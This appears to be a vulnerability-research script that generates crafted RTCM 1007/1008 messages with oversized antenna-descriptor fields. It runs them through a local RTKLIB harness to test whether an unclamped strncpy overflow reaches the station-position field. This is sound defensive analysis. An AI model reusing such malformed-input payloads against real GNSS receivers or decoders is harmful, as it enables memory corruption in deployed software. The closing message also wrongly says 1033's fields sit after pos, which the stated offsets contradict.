#!/usr/bin/env python3
"""
Does the same unclamped-length pattern in decode_type1007/1008 reach sta.pos?

FuzzingLabs' report notes the same missing-clamp shape in decode_type1007
(rtcm3.c:469 in their checkout) and decode_type1008 (:507), but does not say
where it lands -- see "Relationship to the FuzzingLabs disclosure" in
research/README.md. This answers it, the same way decode_type1033 was
answered: run the real decoder, oversize the descriptor fields it writes with
strncpy, and look at what happens to sta.pos and the dgps sentinel.

sta_t field order (src/rtklib.h) is fixed: name, marker, antdes, antsno,
rectype, recver, recsno, then the ints, then pos[3] at offset 464
(check_offsets.py). decode_type1007 writes only antdes (offset 128); its
maximum reach at the largest legal declared length (255) is 128+255=383 --
short of pos by 81 bytes, and short of the end of sta_t (560 bytes,
sizeof(sta_t)) by 177. decode_type1008 additionally writes antsno (offset
192); its max reach is 192+255=447 -- short of pos by 17 bytes, and still
inside sta_t. Neither field can reach pos, and neither can escape sta_t the
way 1033's recsno does (oob.bin, offset 384, max reach 639) -- so if the
prediction holds, this is a strictly narrower bug than 1033: memory-safety
only, within-struct only, no positioning impact, at any declared length.

That is a prediction from arithmetic on measured offsets, not yet a
measurement of the real decoder. This script is the measurement.

Usage:
    ./check_1007_1008.py            # generate streams, run ./harness
    ./check_1007_1008.py --no-run   # generate only

Needs ./harness built first:  RTKLIB=<checkout> ./build.sh
"""
import argparse
import os
import re
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

from gen_rtcm import msg1005, msg1007, msg1008  # noqa: E402

TRUTH = "-2694685.4730 -4293642.3660 3857878.9240"
SENTINEL = "0x4141414141414141"

# First 31 bytes are the only ones the decoder reads into its staging buffer;
# the rest exist purely to satisfy the frame-length check, same as 1033.
BLOB = b"A" * 31 + b"\xff" * (255 - 31)

CASES = [
    ("1007_benign", lambda: msg1005() + msg1007(antdes=b"TRM59800.00")),
    ("1007_attack", lambda: msg1005() + msg1007(antdes=BLOB)),
    ("1008_benign", lambda: msg1005() + msg1008(antdes=b"TRM59800.00",
                                                 antsno=b"5429R")),
    ("1008_antdes", lambda: msg1005() + msg1008(antdes=BLOB,
                                                 antsno=b"5429R")),
    ("1008_antsno", lambda: msg1005() + msg1008(antdes=b"TRM59800.00",
                                                 antsno=BLOB)),
]


def main():
    ap = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--no-run", action="store_true",
                    help="write the streams but do not invoke ./harness")
    args = ap.parse_args()

    out = os.environ.get("OUT", "/tmp/rtk-1007-1008")
    os.makedirs(out, exist_ok=True)

    paths = []
    for name, build in CASES:
        stream = build()
        path = os.path.join(out, f"{name}.bin")
        with open(path, "wb") as fh:
            fh.write(stream)
        paths.append((name, path))
        print(f"{name}.bin: {len(stream)} bytes")

    if args.no_run:
        return 0

    harness = os.path.join(HERE, "harness")
    if not os.path.isfile(harness):
        print(f"\nno {harness} -- build it first:", file=sys.stderr)
        print("  RTKLIB=<checkout> ./build.sh", file=sys.stderr)
        return 1

    print()
    ok = True
    for name, path in paths:
        res = subprocess.run([harness, path], capture_output=True, text=True)
        out_text = res.stdout
        # the interesting message is the 1007/1008, i.e. the second one
        block = out_text.split("message 2:")[-1]

        pos_line = re.search(r"sta\.pos\s*=\s*(.+)", block)
        dgps_line = re.search(r"rtcm\.dgps\s*=\s*(\S+)", block)
        pos = pos_line.group(1).strip() if pos_line else "MISSING"
        dgps = dgps_line.group(1) if dgps_line else "MISSING"

        pos_untouched = pos.startswith(TRUTH[:20])
        dgps_intact = dgps.startswith(SENTINEL[:6])  # tolerate case/width
        verdict = "OK" if (pos_untouched and dgps_intact) else "UNEXPECTED"
        ok = ok and (pos_untouched and dgps_intact)

        print(f"======== {name} ========")
        for line in block.splitlines():
            if any(f in line for f in
                   ("antdes", "antsno", "sta.pos", "dgps =")):
                print("  " + line.strip())
        print(f"  -> {verdict}")
        print()

    if ok:
        print("Confirmed: in every case, sta.pos stays at truth and the dgps")
        print("sentinel stays intact. decode_type1007/1008 share the same")
        print("unclamped strncpy shape as decode_type1033, but antdes and")
        print("antsno sit too early in sta_t (offsets 128 and 192) to reach")
        print("pos at 464, or to escape sta_t (560 bytes) at all, even at the")
        print("maximum legal declared length. Memory-safety issue, in-struct")
        print("only, no positioning impact -- 1033's rectype/recver/recsno")
        print("are the only fields in the type-1007/1008/1033 family that")
        print("reach pos, because they're the only ones placed after it.")
        return 0
    else:
        print("UNEXPECTED: sta.pos or the dgps sentinel moved. That")
        print("contradicts the offset arithmetic above -- do not report the")
        print("negative result until this is understood.")
        return 1


if __name__ == "__main__":
    sys.exit(main())
